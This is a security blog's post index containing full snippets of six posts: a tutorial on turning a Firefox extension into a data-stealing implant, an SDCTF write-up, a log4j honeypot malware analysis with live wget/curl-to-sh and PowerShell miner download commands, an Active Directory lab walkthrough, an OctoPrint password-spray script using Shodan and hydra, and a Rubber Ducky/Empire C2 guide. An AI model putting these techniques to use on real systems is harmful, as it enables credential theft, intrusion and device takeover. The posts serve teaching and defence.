[ { "title": "Create Evil Firefox Extensions With JS-Tap Part 1", "url": "/posts/create-evil-extensions/", "categories": "Pentesting, Tutorial, Red Team", "tags": "extensions, javascript, injection, firefox", "date": "2024-01-25 17:32:00 -0600", "snippet": " The associated GitHub repository for scripts used in this blog post is located at github.com/zcrosman/firefox-extension-js-tapIntroBrowser extensions are like double agents in your browser - they offer handy features but often at the cost of your privacy. They can access all your online activities, and if they turn malicious or get compromised, it’s game over for your data.Modifying browser extensions to become malicious is alarmingly easy. Extensions are built using web technologies like JavaScript, HTML, and CSS. The source code for these extensions is already stored on your computer and easy to manipulate. A hacker can inject malicious code into an otherwise benign extension by directly modifying the extension’s code to access EVERYTHING! This includes cookies, user input, local storage, and sites visited.I’ll walk through how to create a malicious Firefox extension with a payload from JS-Tap. JS-Tap is a versatile JavaScript payload designed for red team operations. It’s used for attacking web applications, either as an XSS payload or as a general JavaScript payload. I’ll review how to use this with Firefox extensions so EVERY loaded page is injected and we can collect all of the valuable information from a web portal.JS-Tap is capable of collecting the following: Client IP address, OS, Browser User inputs (credentials, etc.) URLs visited Cookies (that don’t have httponly flag set) Local Storage Session Storage HTML code of pages visited (if feature enabled) Screenshots of pages visited Copy of XHR API calls (if monkeypatch feature enabled) Endpoint Method (GET, POST, etc.) Headers set Request body and response body Copy of Fetch API calls (if monkeypatch feature enabled) Endpoint Method (GET, POST, etc.) Headers set Request body and response body JS-Tap SetupThe JS-Tap installation has a very basic setup process. It’s important to modify the telemlib.js file as required in the setup guide. Make sure that this payload is working with the tools included in tools/ (clientSimulator.py &amp;amp; monkeyPatchLab.py).It’s also important to note that although I’m using JS-Tap in this walkthrough, any JavaScript payload could be interchanged with this one. This payload will be fairly persistent in the browser and constantly collecting data on every site to send back to the server. Alternatively, payloads could be set to run only a single time or target specific websites. The possibilities are endless with this type of attack.Unpacking ExtensionsThe exact location of packed extensions in the Firefox application folder varies based on the operating system’s file system, with specific locations for Windows, macOS, and Linux systems: Windows: C:\\Users\\&amp;lt;UserName&amp;gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&amp;lt;ProfileName&amp;gt;\\extensions macOS: ~/Library/Application Support/Firefox/Profiles/&amp;lt;ProfileName&amp;gt;/extensions Linux: ~/.mozilla/firefox/&amp;lt;Profile Name&amp;gt;/extensionsIn these folders, Firefox extensions are packaged as .xpi files. This format can be unzipped to reveal all of the source code of the extension. A quick bash one-liner can be used to unpack all of these extensions in this folder:# Unzip all of the extensions in the extensions folderfor f in *.xpi; do unzip &quot;$f&quot; -d &quot;${f%*.xpi}&quot;; doneExtension AnalysisOnce all of the extensions are unpacked, we can try to find a good target. Each of the extensions contains the file manifest.json. This is the extension’s configuration file that includes permissions and additional extension information. Many of these extensions use an ID as the folder/extension name, which makes it slightly more confusing to tell them apart. Another bash one-liner can be used to quickly get more info about these extensions.Quickly view the extension names and descriptions associated with each folder:for d in */; do echo &quot;$d&quot;; jq &#39;.name, .description&#39; &quot;$d/manifest.json&quot;; doneExample output:------SNIP-------87677a2c52b84ad3a151a4a72f5bd3c4@jetpack/Grammarly: Grammar Checker and AI Writing AppImprove your writing with Grammarly&#39;s communication assistance. Spell check, grammar check, and punctuation check in one tool. Real-time suggestions for improving tone and clarity help ensure your writing makes the impression you want.------SNIP------&quot;Some of these configurations are interesting for this project. Further analysis can be done to view more details by manually reviewing the manifest files or using a script to display additional information.For example, using a custom search script:./search-ext.sh extensions/Example output:------SNIP-------Directory: extensions/wappalyzer@crunchlabz.com/Name: Wappalyzer - Technology profilerDescription: Identify web technologiesBackground Scripts: not setContent Script Matches: http://*/*, https://*/*Content Script Exclude Matches: not setContent Script JS: js/content.jsPermissions: cookies, storage, tabs, webRequest, http://*/*, https://*/*------SNIP-------For the rest of this walkthrough, I’ll use the Wappalyzer extension as an example. Wappalyzer is an extension that’s used to identify the technology used on websites. I want to point out some important parts of the manifest.json file that are crucial to the implant: content_scripts.matches - Sites that the extension will run the specified JavaScript on content_scripts.excludes - Sites that are excluded from the JavaScript execution content_scripts.js - JavaScript files that are executed in the background of the specified sitesIn this example, all that would need to be modified is the content_scripts.js since it will already run on all sites.Tap That ExtensionI wrote a bash script to easily update the manifest.json to include the necessary settings and drop the JavaScript file in the required folder. I’ll walk through how it works.This is what part of the manifest.json looks like before modification for the Grammarly extension. The extension runs src/js/Grammarly-check.js excluding the pages in “exclude_matches”:&quot;content_scripts&quot;: [ { &quot;all_frames&quot;: true, &quot;match_about_blank&quot;: true, &quot;css&quot;: [ &quot;src/css/Grammarly-fonts.styles.css&quot; ], &quot;js&quot;: [ &quot;src/js/Grammarly-check.js&quot; ], &quot;matches&quot;: [ &quot;&amp;lt;all_urls&amp;gt;&quot; ], &quot;exclude_matches&quot;: [ &quot;*://outlook.live.com/*&quot;, ----SNIP---- &quot;*://docs.google.com/document/*&quot; ], &quot;exclude_globs&quot;: [ &quot;*docs.google.com*&quot; ], &quot;run_at&quot;: &quot;document_idle&quot; } ]Updated Version:&quot;content_scripts&quot;: [ { &quot;all_frames&quot;: true, &quot;match_about_blank&quot;: true, &quot;css&quot;: [ &quot;src/css/Grammarly-fonts.styles.css&quot; ], &quot;js&quot;: [ &quot;src/js/Grammarly-check.js&quot;, &quot;js/telemlib.js&quot; ], &quot;matches&quot;: [ &quot;http://*/*&quot;, &quot;https://*/*&quot; ], &quot;run_at&quot;: &quot;document_idle&quot; }]The process involves injecting a JavaScript payload (like JS-Tap) into a Firefox extension. This script updates the extension’s manifest.json file and slips in our payload to run in the background. It also ensures that the script runs on all pages if it wasn’t configured to do so already.How Does It Work?Updating manifest.json: The script adds our payload to the content scripts array, telling the extension to run our malicious script on every website.Moving the Payload: The script then moves the payload (our telemlib.js file) to where the extension expects to find it. File location is crucial for proper execution.The modification process involves: Loading and parsing the existing manifest.json Modifying the content scripts configuration to include our payload Adding the malicious JavaScript file to the extension directory Ensuring proper permissions are set for data collectionTesting Your Tapped ExtensionsLoad the Extension in Firefox: Head to about:debugging, click “Load Temporary Add-on”, and choose your modified manifest.json. Your extension now has enhanced capabilities! Once you load the extension, it will automatically be loaded into all of your existing Firefox tabs and future tabs or windows.See It in ActionOpen Firefox’s Network tab to watch your payload in action. You can witness in real-time as your injected JavaScript interacts with each page, capturing and transmitting data seamlessly. If you’re using an unmodified JS-Tap payload, you should also see some logs in the browser console.JS-Tap Dashboard Filled With DataWatch as data starts flooding in from the malicious extension on the JS-Tap dashboard. The dashboard becomes a hub of activity, displaying information collected from the target browser sessions.ConclusionThis walkthrough demonstrates how easy it is to weaponize legitimate browser extensions for red team operations. By modifying the manifest.json and injecting malicious JavaScript payloads, attackers can gain persistent access to all user browsing data. This technique highlights the importance of extension security and the need for users to be cautious about the extensions they install." }, { "title": "SDCTF 2022", "url": "/posts/sdctf/", "categories": "CTF, SDCTF", "tags": "ghunt, cryptocurrency, Vigenere Cipher, Crypto, OSINT, Web", "date": "2022-05-04 18:32:00 -0500", "snippet": "Lots of Logs Category Difficulty Solves Points Web Easy 74 175 Challenge DescriptionAs a professional logger, I made an extensive logger that logs all of the logs I log to the blog I blog so that no log goes unlogged. I post some logs to the log catalog on my log blog.The page featured a few links to logs for example - https://logs.sdc.tf/logs/2022/3/9/Wed.log. There wasn’t anything intersting in the logs linked on the homepage.Welcome to LoggerOS 11.02.3 (GNU/Linux 4.7.8-23-generic)john@logger:~# ./loggerWed 03/09 07:20:31 START : ******** STARTING LOGGING *******Wed 03/09 07:20:31 LOG : 0 logs logged!Wed 03/09 07:21:25 LOG : 13 logs logged!Wed 03/09 07:22:05 PROC : Processing 13 logs! Wed 03/09 07:22:45 LOG : 13 logs logged!Wed 03/09 07:23:31 LOG : 8 logs logged!Wed 03/09 07:24:23 LOG : 11 logs logged!--- [SNIP] ---There wasn’t anything interesting in the logs, but we could view logs not linked from the home page by following the same format.SolutionAfter testing some random dates, I noticed that the logs go back a few years. It would take forever to go though these manually, so I created a quick script to search though the logs for a flag.import datetimeimport requestsf = open(&quot;log.log&quot;, &quot;w&quot;)url = &#39;https://logs.sdc.tf/logs/&#39;req = requests.session()# Format: 2021/12/15/Wed.logweek_days = [&#39;Mon&#39;, &#39;Tue&#39;, &#39;Wed&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;, &#39;Sun&#39;]for year in range(2022,2015,-1): for month in range(1,13): for day in range(1,32): try: week = datetime.date(year,month,day).weekday() except: # error based on invalid day in month week = 0 dow = week_days[week] log = f&#39;{year}/{month}/{day}/{dow}.log&#39; r = req.get(url + log) f.writelines(r.text) print(f&#39;Trying: {log} Response length: {len(r.text)}&#39;) #print(r.text) if &quot;sdctf&quot; in r.text: print(r.text) exit()The flag wasn’t found in any of the logs, so I saved all of the logs to a single file to dive into it further.zach$ grep &quot;:~#&quot; log.log | grep -v &quot;/logger&quot;john@logger:~# nc -l 1337 &amp;gt; exploitjohn@logger:~# chmod +x exploitjohn@logger:~# ./exploitAfter noticing the commands above I went back to the full log file to see what else was done around this commands.john@logger:~# nc -l 1337 &amp;gt; exploitjohn@logger:~# chmod +x exploitjohn@logger:~# ./exploit# whoamiroot# lsexploit logs site# ls logs 2016 2017 2018# tar -cf data.tar.gz ~/logstar: Removing leading `/&#39; from member namestar: /home/john/data.tar.gz: file is the archive; not dumped# nc -l 1337 &amp;lt; data.tar.gz# rm -rf /home/john/logs/2018/6/10 /home/john/logs/2018/6/11 /home/john/logs/2018/6/12# rm data.tar.gz# mkdir /lib/network# nc -l 1337 &amp;gt; /lib/network/daemon# chmod +x /lib/network/daemon# /lib/network/daemonSuccess... running on port 1338# nc logger.sdc.tf 1338Pass: 82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38dls /home/johnexploit logs site^C# rm exploit# echo &quot;&quot; &amp;gt; .bash_history# echo &quot;&quot; &amp;gt; ~/.bash_history# exitThis was pretty interesting. I tried connecting to port 1338 and it was still open. All I had to do was use the same password that was found in the logs above.zach$ echo &quot;82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d&quot; | nc logger.sdc.tf 1338sdctf{b3tr4y3d_by_th3_l0gs_8a4dfd}Paypal-Playboy Category Difficulty Solves Points OSINT Hard 23 300 Challenge DescriptionWe’ve apprehended somebody suspected of purchasing SDCTF flags off an underground market. That said, this guy is small fry. We need to find the leaker and bring them to brutal justice!Attached is an email we retrieved from his inbox. See if you can’t figure out the boss of their operation.Flag format is sdctf{…}Attachmend: add link to githubSolutionThis was solved right after the event ended, but I thought I would still share.I started by analyzing the email file included in the challenge. There were two important parts that I started with.The main text of the email was encoded with base64. The text was in another lanuguage, but after tranlating with Google Tranlate I got the following message:Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. You can also find us on PayPal or on the blockchain. 0xbad ... A43B ..... SDCTF {Forgery_bana} 3️⃣ ✳ ✳️ 👟 📙 👈 🔠 🖖 🐾 🃏 🕕 ❇ ❇ ❇️ ⬇ 🈷️ 🕜 ↘️ 🍕 👨 🌏 ◾️ 🌎 😸 🍄 ✳️ 🕡 🚛 👧 🔻 ♓️ 🔠 😭So from this text, we know that there should be another link included in the email.I used on online tool to convert the base64 encoded png file that was also included in the email. https://onlinepngtools.com/convert-base64-to-pngThis QR code links to the Cash App account $limosheenThere isn’t anything intersting on the account page, but you can pivot from the account name limosheen. From the translated email we also know that the person of interest uses Paypal and some type of cryptocurrency.The Paypal accounthttps://www.paypal.com/paypalme/limosheenBy searching for the address that was in the Paypal about section we can see all transactions.https://ropsten.etherscan.io/address/0xBAd914D292CBFEe9d93A6A7a16400Cb53319A43BFrom the challenge description, we know that we are looking for the boss. Always follow the money! By searching the address that the cryptocurrency to going to (0x949213139D202115c8b878E8Af1F1D8949459f3f) on twitter we find the “boss”. This page also includes a base64 encoded flag. Flag: sdctf{You_Ever_Dance_With_the_Devil_In_the_Pale_Moonlight}Google Ransom Category Difficulty Solves Points OSINT Easy 155 100 Challenge DescriptionOn no! A hacker has stolen a flag from us and is holding it ransom. Can you help us figure out who created this document? Find their email address and demand they return the flag!Attachment: Google Docs Ransome Letter LinkSolutionzach$ python3 ghunt.py doc https://docs.google.com/document/d/1MbY-aT4WY6jcfTugUEpLTjPQyIL9pnZgX_jP8d8G2Uo .d8888b. 888 888 888 d88P Y88b 888 888 888 888 888 888 888 888 888 8888888888 888 888 88888b. 888888 888 88888 888 888 888 888 888 88b 888 888 888 888 888 888 888 888 888 888 Y88b d88P 888 888 Y88b 888 888 888 Y88b. Y8888P88 888 888 Y88888 888 888 Y888 Document ID : 1MbY-aT4WY6jcfTugUEpLTjPQyIL9pnZgX_jP8d8G2Uo[+] Creation date : 2022/01/05 22:58:38 (UTC)[+] Last edit date : 2022/01/05 23:08:11 (UTC)Public permissions :- reader[+] Owner found !Name : Amy SDCTFEmail : amy.sdctf@gmail.comGoogle ID : 13481488189780380748[+] Custom profile picture !=&amp;gt; https://lh3.googleusercontent.com/a/default-user=s64Full screen width and center alignmentVinegar Category Difficulty Solves Points Crypto Easy 193 100 Challenge DescriptionMy friend gave me another encrypted flag…I think they hate me! I heard them yell something about “Vinegar”, but I still don’t know what they’re talking about!Ciphertext{wbeyrjgewcfroggpesremvxgvefyrcmnnymxhdacgnnrwprhxpuyyaupbmskjrxfopr}SolutionFrom the challenge name it was obvious it was related to the Vigenere Cipher.This cipher is basically a Ceasar Cipher with a different shift for each character based on the key.There are a few online tools that I always try before diving into a more complicated solution. I used https://www.guballa.de/vigenere-solver for this challange to get the flag.sdctf{couldntuseleetstringsinthisonesadlybutwemadeitextralongtocompensate}" }, { "title": "Analyzing Log4j Malware", "url": "/posts/log4j-malware/", "categories": "Malware Analysis, log4j", "tags": "log4j, crypto miner, honeypot", "date": "2021-12-23 17:32:00 -0600", "snippet": "IntroOn December 9, 2021 CVE-2021-44228 was disclosed. It is related to the log4j package that is commonly used for Java logging. This is a RCE vulnerability and attacks have been ongoing for a few weeks. I wanted to check out some active exploits and dive into what exactly they are doing. I have created a Github repository and added some of the files found from looking into the attempted exploitation of a honeypot I set up.Project Github: https://github.com/zcrosman/log4j-malwareSetting up a honeypotSetting up a honeypot to analyze basic exploitation attempts is extremely simple. I used a honeypot created by MalwareTech that was already set up and easily deployable. I only made a couple of changes to the configuration of the ports and server name.Test of exploitation attempt shows that detection is workingAfter setting up the honeypot, it becomes a waiting game. Within an hour, the first exploitation attempt came though. For each attempt, the malicious string is added to the four different fields.Attempted exploitation from several fieldsAnalyzing the attempted exploitationI pulled the Exploit.class from the host identified above to see what it was doing. There are two main parts to this script. If it is a Linux, host it will download and execute the ‘log’ file. On Windows hosts, the file ‘z.cmd’ and ‘setup_minerocean_miner.bat’ files are downloaded and executed.Full Exploit.class scriptFurther analysis of Linux explotationFor Linux hosts, the script will download and run ‘log’. This script downloads and attempts to execute three different files. (wget -qO - http://51.250.28.5/.l/log   curl http://51.250.28.5/.l/log) sh ‘log’ fileBoth of the pty files are ELF executables. The ‘pty3’ file is for 64-bit hosts and ‘pty4’ is for 32-bit hosts. Both files were found to be malicious by checking the hash on VirusTotal. Several tools also identified the malware as Tsunami.pty3 VirusTotal analysispty4 VirusTotal analysisAdditionally, the script downloads and runs the ‘ldm’ file. This is just a bash script that runs on top of the executables. I have added this file to the GitHub repo.Further analysis of Windows exploitationIf the vulnerable host is running a Windows OS, then the commands below are run in Powershell. The first step is downloading a crypto miner and an additional script to start it. Once the miner is set up, a setup script from a public GitHub repository is used to set up the miner.new-object System.Net.WebClient).DownloadFile(&#39;http://150.60.139.51:80/wp-content/themes/twentyseventeen/s.cmd&#39;powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&#39;http://68.183.165.105:80/wp-content/themes/twentyseventeen/xmrig64.exe&#39;,&#39;xmrig.exe&#39;)xmrig.exe -o pool.supportxmr.com:5555 -u 46QBumovWy4dLJ4R8wq8JwhHKWMhCaDyNDEzvxHFmAHn92EyKrttq6LfV6if5UYDAyCzh3egWXMhnfJJrEhWkMzqTPzGzsE -p lognew-object System.Net.WebClient).DownloadFile(&#39;https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat&#39;)SummaryIOCs46.105.95[.]22047.241.208[.]15551.250.28[.]568.183.165[.]105150.60.139[.]51192.46.216[.]22412cedf7cd63208ee8fd9d0359637c46c pty3fe5177cbcb78d1aaac9e5adbb9928a74 pty465009620e1f8ec829801048d8200bfeb ldm.sh4a9acf6ce16ed6b978648ef9b3eeca2f log41857b926bb8c47e24317aafbfa8e832 s.cmda6ef05385cd4f14349562d98b90a39ce Exploit.class" }, { "title": "TryHackMe - Attacktive Directory", "url": "/posts/attaacktive-directory/", "categories": "TryHackMe, Active Directory", "tags": "impacket, secretsdump, psexec, kerberos, kerbrute", "date": "2021-11-03 18:32:00 -0500", "snippet": "TryHackMe Room: Attactive DirectoryInitial Enumerationsudo nmap --top-ports 1000 -sV 10.10.146.23Nmap scan report for 10.10.146.23Host is up (0.14s latency).Not shown: 987 closed portsPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-03 00:49:22Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal ServicesService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windowsEnumeration of KerberosWith the nmap scan, we identified above that this host is running Active Directory so we can try abusing Kerberos. If we already had valid credentials, we could use GetUserSPNs to get TGS hashes. So far we don’t have credentials, so we have to find another method. For this lab, a user list was provided to enumerate user accounts. Kerbrute userenum can be used to validate users on the domain. Once we have a valid list of users, GetNPUsers can be used to identify if any of these accounts do not require Kerberos preauthentication set (UF_DONT_REQUIRE_PREAUTH).kerbrute userenum is used to identify valid user accountsGetNPUsers is used to get TGTsThe credentials for backup were cracked with hashcatInitial AccessEnumeration of the smb sharesbackup_credentials in the backup smb shareContents of backup_credentials.txtThe string found in the text file looks like it could be base64 encoded. Even if I think I already know how a string could be encoded, I like to use cyberchef to decode it. The site has many recipes on string encoding/decoding. One of my favorite features is the “Magic” recipe. This recipe will use different types of manipulation available on the site. It wasn’t needed in this case, but it will also attempt to identify multiple layers of string manipulation. With the string found in backup_credentials.txt, cyberchef identified that it was encoded with base64. This revealed the credentials of the backup account.Privledge EscalationSince we now have a low-level user account we can now try to dump hashes with secretsdump.py. After the hashes are obtained, we can get administrative access to the domain controller with psexec.Dumping hashes of the DCAdministrator access with psexec.py" }, { "title": "Dangers of Connecting Your 3D Printer to the Internet", "url": "/posts/octospray/", "categories": "IoT, 3D Printers", "tags": "Octoprint, Password Spray, Brute Force", "date": "2021-10-23 08:15:00 -0500", "snippet": "Original Project Github: https://github.com/zcrosman/OctoSpray (shell script)Updated Project Github: https://github.com/zcrosman/OctoSpray-v2 (python with threading and additional functionality) This project is a proof of concept and has not been tested on any 3D printers I do not own. All testing was limited to my own 3D printer.IntroLast year I got my first 3D printer. Naturally, I’m constantly trying to add new parts and other upgrades. One of the upgrades I made was connecting my 3D printer to my home network with a Raspberry Pi. There are a few ways to set this up, but a very popular option is OctoPrint. With the Raspberry Pi I can control my printer from anywhere I can access the webserver.Octoprint Printers On The InternetDuring the set up I followed a basic guide I found online. One of the last steps was setting up port forwarding on a router to access the printer from outside the local network. Although this will work, I would not recommend it. My first instinct after seeing this was to check to see how many 3D printers with Octoprint I could find on the internet.Upon searching for “Octoprint” on Shodan over 500 hosts were found. A cool trick that I use to find more OctoPrint web servers is to search by favicon hash. Shodan has a filter called “http.favicon.hash” that is for this exact purpose. When searching by the favicon hash, Shodan was able to find almost 7,000 hosts!Search query – “Octoprint”Search query – “http.favicon.hash:1307375944”Let’s Analyze the OctoPrint Logon PageSo what can be done now that we found almost 7000 printers? Since I have access to an OctoPrint server on my network I can do some testing. Before getting access to the Octoprint dashboard a user must be authenticated.With Burp Suite we can capture the POST request and analyze it. The only important parts we need to pull for the next section are the PATH and two additional parameters (user and pass). Additionally, we can use the error message in the response to better identify unsuccessful authentication attempts.Putting the Script TogetherWith a combination of two tools in a bash script, we could find all of the OctoPrint web servers and spray combinations of usernames and passwords. The first part would be to pull the IPs with the Shodan CLI tool. The command below is used to save into a list of IPs that match the favicon hash.shodan search --fields ip_str --limit $maxIPs http.favicon.hash:1307375944The next command is used to spray the logins with weak credentials. This command sends the same POST request that was intercepted with Burp.hydra -L $usrList -P $pwdList $IP http-post-form \\&quot;/api/login:user=^USER^&amp;amp;pass=^PASS^&amp;amp;Login=Login:Incorrect username or password&quot;These two lines above do most of the work in my script. The basic idea of the script is to loop through the usernames and passwords for each IP that is found in the Shodan query.What Could Be Done With A Login?If we have credentials to access the dashboard we now have full control of the printer. This would also include a live view of the printer if a camera was also installed. That isn’t the biggest threat though. The main focus is the controls that are accessible in the dashboard.The dashboard allows access to all motors including the extraction motorThe dashboard also allows for direct control of the tool and bedOn top of these controls, files can also be uploaded to print. These are of the file type GCODE. Without getting too deep into it, GCODES can be used maliciously. The file is a list of instructions for the printer. The instructions can change settings, move the nozzle, extrude, change temperature, etc. These files are usually generated by 3D printing software like Cura, but they can also be created manually. Certain combinations of these commands can cause damage to the printer. For example, a GCODE file can instruct the printer to scrape and damage the printing bed or purposely clog the nozzle. Possibly the most malicious script would be to set the printer to the max temperature for an extended period of time. Not only could this cause damage to the printer, but it is also a fire hazard.3D Printer Safety at Issue, Again « FabbalooProper Way To Access A Printer From AnywhereAll of these risks can easily be avoided by not exposing your 3D printer to the internet. My preferred method would be to set up a VPN to access your home network. This is my preference because it would also work for other services running on your internal network. If setting up an VPN isn’t the route you want to go there are several plugins that can be used. Although I don’t have experience with these options a list of plugins can be found here." }, { "title": "How to Create a Ducky Script for Empire", "url": "/posts/ducky-empire/", "categories": "Tutorial", "tags": "PowerShell Empire, Rubber Ducky, ducky script, powershell, C2", "date": "2021-10-03 17:22:00 -0500", "snippet": "Physical security is a major issue in cybersecurity. A malicious actor can set up a C2 server and have full control of a computer within a few seconds with a USB rubber ducky. Once an agent is set up, a malicious actor can read/write files, access command prompt, run scripts/payloads/modules, pivot, etc.There are many different command and control options available. Empire is the one that I’m most familiar with, but a similar technique can be done with any other C2.Before setting up listeners and stagers, the Empire server and client have to be started. For this example, I will be doing this on a Kali VM through VMWare. This will be easy to work with since the victim’s PC will be on the same network. If you wanted to try this on a PC that isn’t on your network you would need to set up port forwarding. Another good option would be to run it on a VPS like AWS Lightsail.Set up your listener by typing “uselistener http” in the Empire client. When you set up your listener there will be a list of options you can change. Most of these can be left as the default values, but there are a few that should be changed.The three values that I updated were Name, Port, and Host. The port setting can be set to anything, but it’s better to use one that would be expected to be used by the victim’s computer. For this example, I’m using an internal IP that the victim can access. I recommend that the DefaultProfile be changed as well, but I’ll keep it the default for this example.Once all your settings are updated, you can run the command “execute”. This will set up your listener to be used.The next step is to create the stager for the rubber ducky to run. There are a few ducky stagers available, but we are targeting a windows host in this example. The only option that you will need to update is the Listener. This is the name of the listener set up in the previous step.To generate the ducky script use the command “execute”. This will generate the raw ducky script that can be used to connect back to the Empire server.A majority of the script is encoded, but we can take a look at it by decoding it. The encoded portion of the command is in Base64. If we decode this message it makes it readable, but difficult to understand without dissecting it further.There’s a lot of interesting info in this command, but I picked out one variable to look into. The $ser variable is another encoded string. When this is decoded it shows the C2 server address and port that I set in the steps above.There are a few different ways to generate a payload that the Rubber Ducky can use. The easiest option is to do it is through an online ducky script encoder. There are a few out there, but I typically use https://hak5.org/pages/ducky-encoder.Once you generate the script, load it on the rubber ducky. Now just plug it into a Windows computer. The ducky script will open the powershell window and enter the command to connect back to our C2 server. Once it completes you will see a new agent in your Empire window.In the Client window type “agents” to view all agents available. We can see our newly added agent where we used the DuckyExample listener below.The ducky script was successful in creating an agent that connects back to our C2 server!" } ]
